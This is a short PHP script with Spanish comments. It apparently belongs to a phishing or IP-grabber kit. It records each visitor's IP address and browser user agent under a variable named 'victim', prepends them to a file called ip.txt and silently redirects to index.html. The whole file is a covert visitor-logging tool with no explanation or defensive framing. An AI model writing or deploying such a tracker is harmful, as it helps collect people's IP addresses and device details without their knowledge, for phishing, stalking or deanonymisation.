<?php

// Obtener IP del visitante
if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ipaddress = $_SERVER['HTTP_CLIENT_IP'] . "\r\n";
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'] . "\r\n";
} else {
    $ipaddress = $_SERVER['REMOTE_ADDR'] . "\r\n";
}

// Obtener el navegador del visitante
$useragent = "User-Agent: ";
$browser = $_SERVER['HTTP_USER_AGENT'];

// Armar la entrada para el archivo
$file = 'ip.txt';
$victim = "IP: ";
$new_entry = $victim . $ipaddress . $useragent . $browser . "\r\n";

// Leer contenido anterior
$old_content = file_exists($file) ? file_get_contents($file) : '';

// Escribir el nuevo contenido antes del viejo (prepend)
file_put_contents($file, $new_entry . $old_content);

// Redirigir al usuario a index.html
header('Location: index.html');
exit;
?>

